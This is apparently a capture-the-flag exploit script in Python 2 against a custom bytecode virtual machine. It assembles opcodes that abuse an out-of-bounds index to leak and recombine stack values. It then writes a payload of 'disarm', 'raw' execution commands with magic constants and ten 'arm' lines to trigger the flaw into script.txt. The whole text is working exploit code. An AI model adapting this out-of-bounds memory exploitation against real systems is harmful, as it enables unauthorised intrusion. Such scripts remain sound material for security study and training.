EXECUTE_OWN = -0x7B967C7C
OPEN_7CC4 = -0x7B7C7BCF

command = [
0xe9,
0x100 - 0x7, # get index(-7): under oob access
0x4, # dup
0x58, # push 0x8
0x8,
0x0,
0x0,
0x0,
0xf9, # swap
0xe0, # shr (8)
0x58, # push 0xff
0xff,
0x0,
0x0,
0x0,
0x72, # and # get s[1]
0x58, # push 0x18
0x18,
0x0,
0x0,
0x0,
0xf9, # swap
0x9a, # shl # get s[1]000000
0xf9, # swap
0x58, # push 0xffffff
0xff,
0xff,
0xff,
0x0,
0x72, # and # get 00s[2]s[1]s[0]
0x30, # or # get s[1]s[2]s[1]s[0]
0xf9, # swap
0x38, # pop
0xf9, # swap
0x38, # pop
0xc1, # div
0x0,
]

command = ''.join(map(chr, command)).encode('hex')

payload = 'disarm\n' # execute command to leak status on stack
payload += ''
payload += 'raw ' # enable custom vm execution
payload += str(OPEN_7CC4) + '\n'
payload += 'raw ' # vm execution
payload += str(EXECUTE_OWN) + ' '
payload += command + '\n'
payload += 'arm\n' * 10 # ten times to `trigger`

print payload

f = open('script.txt', 'wb')
f.write(payload)
f.close()
